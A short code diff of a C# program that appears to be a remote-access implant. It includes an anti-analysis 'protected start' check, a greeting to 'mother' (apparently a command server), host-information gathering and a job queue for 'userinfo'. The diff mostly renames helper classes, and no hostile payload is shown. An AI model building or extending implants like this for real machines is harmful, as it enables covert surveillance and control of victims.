@@ -1,14 +1,11 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Net.WebSockets;
-using System.Diagnostics;
-using System.Management;
-using System.DirectoryServices;
 using BeaverUpdate;
+using VoidSerpent;
 
 namespace beaverUpdate
 {
@@ -17,7 +14,7 @@ namespace beaverUpdate
         static async Task Main(string[] args)
         {
             // protected start: one instance, specific parents
-            if (!Utilities.protectedStart())
+            if (!BetrayalIsASymptom.protectedStart())
             {
                 Console.WriteLine("Unable to run due to security measures.");
                 return;
@@ -28,7 +25,7 @@ namespace beaverUpdate
 
             // Say hello to mother. 
             Console.WriteLine("Hello mother!");
-            Utilities.HostInfo hostInfo = Utilities.GetHostInfo();
+            ToWakeAndAvengeTheDead.HostInfo hostInfo = ToWakeAndAvengeTheDead.GetHostInfo();
 
             // UserInfo
             string userJob = db.GetJobStatus("userinfo");
